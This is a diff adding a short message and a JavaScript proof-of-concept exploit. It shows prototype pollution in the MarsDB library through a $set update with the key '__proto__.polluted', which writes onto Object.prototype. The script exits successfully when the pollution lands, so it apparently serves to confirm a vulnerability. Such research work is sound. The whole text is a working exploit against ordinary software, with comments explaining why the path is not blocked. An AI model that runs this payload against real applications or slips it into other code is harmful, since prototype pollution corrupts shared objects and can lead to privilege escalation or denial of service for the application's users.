@@ -1,0 +1,22 @@
+Confirmed the prototype pollution works. Here's the exploit:
+
+```javascript
+const MarsDB = require("./node_modules/marsdb");
+
+async function main() {
+  const users = new MarsDB.Collection('users');
+  await users.insert({ _id: 'victim', name: 'alice' });
+
+  // DocumentModifier's $set walks the dotted path via findModTarget without
+  // blocking '__proto__', so this write escapes the document and lands on
+  // Object.prototype itself.
+  await users.update({ _id: 'victim' }, {
+    $set: { '__proto__.polluted': 'yes' }
+  });
+
+  console.log('polluted flag on a brand-new plain object:', ({}).polluted);
+  process.exit(({}).polluted === 'yes' ? 0 : 1);
+}
+
+main();
+```
